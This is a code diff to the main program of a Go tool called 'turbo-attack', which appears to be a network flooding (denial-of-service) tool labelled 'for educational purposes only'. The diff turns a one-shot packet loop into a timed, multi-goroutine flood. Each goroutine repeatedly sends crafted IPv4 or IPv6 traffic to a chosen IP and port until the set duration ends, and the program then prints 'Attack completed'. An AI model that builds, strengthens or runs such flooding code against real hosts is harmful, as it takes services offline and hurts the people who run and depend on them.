@@ -6,7 +6,7 @@
 // For educational purposes only.
 
 // go build
-// PATH=/usr/local/go/bin:"$PATH" /usr/bin/dlv debug --headless --listen=:2345 --log --api-version=2 turbo-attack -- eth0 4 192.168.0.2 443 1
+// PATH=/usr/local/go/bin:"$PATH" /usr/bin/dlv debug --headless --listen=:2345 --log --api-version=2 turbo-attack -- eth0 4 192.168.0.2 443 60 10
 
 package main
 
@@ -16,6 +16,7 @@ import (
 	"os"
 	"runtime"
 	"sync"
+	"time"
 
 	"github.com/mytechnotalent/turbo-attack/convert"
 	"github.com/mytechnotalent/turbo-attack/routine"
@@ -33,8 +34,8 @@ func main() {
 		log.Fatal("application will only run as root (sudo)")
 	}
 
-	if len(os.Args) != 6 {
-		fmt.Println("usage: turbo-attack_010_linux_arm64 <ethInterface> <ipVersion> <ip> <port> <count>")
+	if len(os.Args) != 7 {
+		fmt.Println("usage: turbo-attack_010_linux_arm64 <ethInterface> <ipVersion> <ip> <port> <time> <goroutines>")
 		return
 	}
 
@@ -42,31 +43,85 @@ func main() {
 	ipVersion := os.Args[2]
 	ip := os.Args[3]
 	port := os.Args[4]
-	count := os.Args[5]
+	attackTime := os.Args[5]
+	goroutines := os.Args[6]
 
 	var wg sync.WaitGroup
+
+	// Parse attack duration
+	attackDuration, err := convert.ParseTime(&attackTime)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	// Parse goroutines count
+	goroutineCount, err := convert.ParseGoroutines(&goroutines)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	// Create a channel to signal when to stop
+	stopChan := make(chan struct{})
+
+	// Start a timer to stop the attack after the specified duration
+	go func() {
+		time.Sleep(time.Duration(*attackDuration) * time.Second)
+		close(stopChan)
+	}()
+
 	if ipVersion == "4" {
-		ip4Byte, portByte, countInt, err := convert.IP4(&ethInterface, &ip, &port, &count)
+		ip4Byte, portByte, err := convert.IP4(&ethInterface, &ip, &port)
 		if err != nil {
 			log.Fatal(err)
 		}
-		for i := 0; i < *countInt; i++ {
+
+		// Launch goroutines
+		for i := 0; i < *goroutineCount; i++ {
 			wg.Add(1)
-			routine.IP4(&ethInterface, ip4Byte, portByte)
-			wg.Done()
+			go func() {
+				defer wg.Done()
+				for {
+					select {
+					case <-stopChan:
+						return
+					default:
+						err := routine.IP4(&ethInterface, ip4Byte, portByte)
+						if err != nil {
+							log.Println(err)
+						}
+					}
+				}
+			}()
 		}
-		wg.Wait()
 	} else if ipVersion == "6" {
-		ip6Byte, portByte, countInt, err := convert.IP6(&ethInterface, &ip, &port, &count)
+		ip6Byte, portByte, err := convert.IP6(&ethInterface, &ip, &port)
 		if err != nil {
 			log.Fatal(err)
 		}
-		for i := 0; i < *countInt; i++ {
-			routine.IP6(&ethInterface, ip6Byte, portByte)
+
+		// Launch goroutines
+		for i := 0; i < *goroutineCount; i++ {
+			wg.Add(1)
+			go func() {
+				defer wg.Done()
+				for {
+					select {
+					case <-stopChan:
+						return
+					default:
+						err := routine.IP6(&ethInterface, ip6Byte, portByte)
+						if err != nil {
+							log.Println(err)
+						}
+					}
+				}
+			}()
 		}
 	} else {
 		fmt.Println("valid: 4 or 6")
 		return
 	}
+
 	wg.Wait()
+	fmt.Println("Attack completed")
 }
